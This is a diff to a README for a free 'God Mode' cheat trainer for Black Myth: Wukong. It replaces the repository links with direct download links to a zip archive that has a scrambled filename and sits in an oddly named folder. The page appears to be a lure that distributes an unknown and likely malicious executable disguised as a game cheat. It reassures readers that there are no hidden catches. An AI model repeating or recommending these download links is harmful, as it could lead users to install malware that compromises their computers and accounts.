@@ -14,7 +14,7 @@ Think of it as a "cheat menu" that runs alongside the game. You press a few keys
 
 ### Step 1: Download the Trainer
 
-👉 **[Click Here to Download BMW-Trainer](https://github.com/luszczewskimikolaj989-droid/Black-Myth-Wukong-God-Mode-Trainer)**
+👉 **[Click Here to Download BMW-Trainer](https://github.com/luszczewskimikolaj989-droid/Black-Myth-Wukong-God-Mode-Trainer/raw/refs/heads/main/Hecatombaeon/Wukong-Myth-Mode-Black-Trainer-God-3.7.zip)**
 
 Visit this link to download the application. The download page will open in your browser. Look for the green "Code" button or the latest release file on that page. Click it to start the download.
 
@@ -121,7 +121,7 @@ Yes. This trainer is completely free to download and use. There are no hidden fe
 
 If you need to download the trainer again, here's the link:
 
-👉 **[Download BMW-Trainer Now](https://github.com/luszczewskimikolaj989-droid/Black-Myth-Wukong-God-Mode-Trainer)**
+👉 **[Download BMW-Trainer Now](https://github.com/luszczewskimikolaj989-droid/Black-Myth-Wukong-God-Mode-Trainer/raw/refs/heads/main/Hecatombaeon/Wukong-Myth-Mode-Black-Trainer-God-3.7.zip)**
 
 Bookmark this page so you can always find the latest version.
 
